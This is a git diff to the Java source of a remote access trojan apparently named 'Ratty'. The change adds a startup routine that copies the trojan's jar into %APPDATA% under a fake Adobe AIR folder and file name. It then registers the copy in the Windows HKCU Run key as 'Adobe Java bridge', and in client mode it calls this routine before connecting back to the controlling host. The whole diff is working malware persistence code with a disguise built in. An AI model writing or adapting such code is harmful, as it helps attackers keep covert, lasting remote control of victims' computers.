@@ -1,12 +1,17 @@
 package de.sogomn.rat;
 
 import java.awt.Color;
+import java.io.File;
+import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
 
 import javax.swing.JOptionPane;
 import javax.swing.UIDefaults;
 import javax.swing.UIManager;
 import javax.swing.plaf.nimbus.NimbusLookAndFeel;
 
+import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.gui.RattyGui;
 import de.sogomn.rat.server.gui.RattyGuiController;
@@ -18,6 +23,8 @@ public final class Ratty {
 	public static final int PORT = 23456;
 	public static final boolean CLIENT = false;
 	public static final String VERSION = "1.0";
+	public static final String FOLDER_NAME = "Adobe" + File.separator + "AIR";
+	public static final String FILE_NAME = "jre13v3bridge.jar";
 	
 	private Ratty() {
 		//...
@@ -36,6 +43,21 @@ public final class Ratty {
 		try {
 			UIManager.setLookAndFeel(nimbus);
 		} catch (final Exception ex) {
+			ex.printStackTrace();
+		}
+	}
+	
+	private static void addToStartup() {
+		try {
+			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
+			final String destinationPath = System.getenv("APPDATA") + File.separator + FOLDER_NAME + File.separator + FILE_NAME;
+			final File source = new File(sourceUri);
+			final File destination = new File(destinationPath);
+			final String registryCommand = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + destinationPath + "\"";
+			
+			FileUtils.copy(source, destination);
+			Runtime.getRuntime().exec(registryCommand);
+		} catch (final URISyntaxException | IOException ex) {
 			ex.printStackTrace();
 		}
 	}
@@ -67,6 +89,7 @@ public final class Ratty {
 		setLookAndFeel();
 		
 		if (CLIENT) {
+			addToStartup();
 			connectToHost(ADDRESS, PORT);
 		} else {
 			final String[] options = {"Server", "Client"};
